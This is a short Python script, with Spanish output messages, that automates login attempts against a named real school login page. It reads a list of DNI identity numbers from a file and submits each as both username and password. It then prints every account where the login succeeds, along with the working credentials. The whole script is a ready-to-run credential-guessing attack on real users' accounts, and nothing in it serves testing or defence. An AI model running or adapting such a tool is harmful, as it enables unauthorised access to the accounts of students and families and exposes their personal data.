import requests
import time
from colorama import Fore,init
from requests.structures import CaseInsensitiveDict
init()
v = Fore.LIGHTGREEN_EX
r = Fore.LIGHTRED_EX
w = Fore.LIGHTWHITE_EX
c = Fore.LIGHTCYAN_EX

archivotextodni = input("lista: ")
with open(archivotextodni) as f_obj:
    lines = f_obj.readlines()
for line in lines:
    dni = line.strip()
    url = "https://fontanatlm.com/usuarios/do_login"
    headers = CaseInsensitiveDict()
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
    headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    headers["X-Requested-With"] = "XMLHttpRequest"
    data = f"usuario={dni}&password={dni}"
 
    resp = requests.post(url, headers=headers, data=data)
    texto_correo = resp.text
    if "1" in texto_correo:
            print(f"{c}EL DOCUMENTO ESTA REGISTRADO EN LA BASE DE DATOS DE TRILCE LOGIN EXITOSO.")
            print(f"{w}DNI: {dni}|{v}USUARIO:{dni}{w}|{v}CONTRASEÑA:{dni}")
            time.sleep(1)
            pass

    else:
        print(f"{r}EL DOCUMENTO {dni} NO ESTA REGISTRADO EN EL COLEGIO TRILCE O LA CONTRASEÑA ES INVALIDA")